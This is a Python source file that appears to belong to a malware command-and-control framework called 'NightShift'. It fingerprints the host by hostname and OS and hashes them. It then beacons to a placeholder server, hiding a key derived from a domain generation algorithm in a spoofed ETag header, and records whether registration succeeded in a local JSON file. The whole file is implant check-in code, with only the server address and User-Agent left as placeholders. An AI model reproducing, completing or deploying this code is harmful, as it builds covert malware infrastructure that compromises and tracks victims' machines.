#!/usr/bin/env python
# -*- coding: utf-8 -*-

import aiohttp
import asyncio
import hashlib
import os
import sys
import json
import string
import socket

from nightshift_dga import NightShift_DGA
from nightshift_cipher import NightShift_Cipher

class NightShift_Init_Check():
    
    def ns_init_check(self):
        init_json_path = 'ns_init_call.json'
        if os.path.exists(init_json_path):
            ns_f_check = True
            with open(init_json_path) as ns_init_f:
                ns_init_data = json.load(ns_init_f)
                host_data_ns = ns_init_data.get('host_data')
                ns_w_check = host_data_ns.get('ns_init')
                if ns_f_check == True and ns_w_check == True:
                    # print("cool, let's go for a spin")
                    return True
                else:
                    # print("well we have work to do")
                    loop = asyncio.get_event_loop()
                    response = loop.run_until_complete(self.ns_init_call(init_json_path))
                    return response

        else:
            loop = asyncio.get_event_loop()
            response = loop.run_until_complete(self.ns_init_call(init_json_path))
            return response

    async def ns_init_call(self,init_json_path):
        try:
            async with aiohttp.ClientSession() as session:
                get_key = NightShift_DGA()
                get_hash = NightShift_Cipher()
                # Host Info
                host_name_f = socket.gethostname()
                os_type_f =  os.name
                host_os_to_hash = str(host_name_f + os_type_f)
                host_os_hashed_f = get_hash.hash_keys_hosts(host_os_to_hash)
                # Server Contact Info
                url = 'http://<init url goes here>:<port>/<uri goes here>'
                header_key = get_key.ns_dga_algorithm('key')
                hash_key = get_hash.hash_keys_hosts(header_key)
                headers = {
                    'User-Agent': '<User Agent goes here>',
                    'ETag': hash_key
                    }
                # print(header_key)
                # print(hash_key)
                # print(headers)
                async with session.get(url, headers=headers) as response:
                    # print("Status:", response.status)
                    # print("Content-type:", response.headers['content-type'])
                    html = await response.text()
                    # print("Body:", html, "...")
        except aiohttp.client_exceptions.ClientConnectorError:
            print("Connection has been refused", file=sys.stderr)
            sys.exit(1)
        with open(init_json_path, 'w') as ns_init_w:
            if html == "OK":
                ns_init_f = True
            else:
                ns_init_f = False
            ns_init_config_f = { "host_data": { "os_type": os_type_f, "host_name": host_name_f, "ns_init": ns_init_f }, "host_hash": host_os_hashed_f }
            # print(ns_init_config_f)
            json.dump(ns_init_config_f, ns_init_w)
            # print(json.dumps(ns_init_config_f, indent = 4, sort_keys=True))
        return ns_init_f

    def run(self):
        ns_check = self.ns_init_check()
        return ns_check
        
if __name__ == "__main__":
    ns_check = NightShift_Init_Check().run()
    print('Here is the Night Shift init config check - {0}'.format(ns_check))
    sys.exit(0)
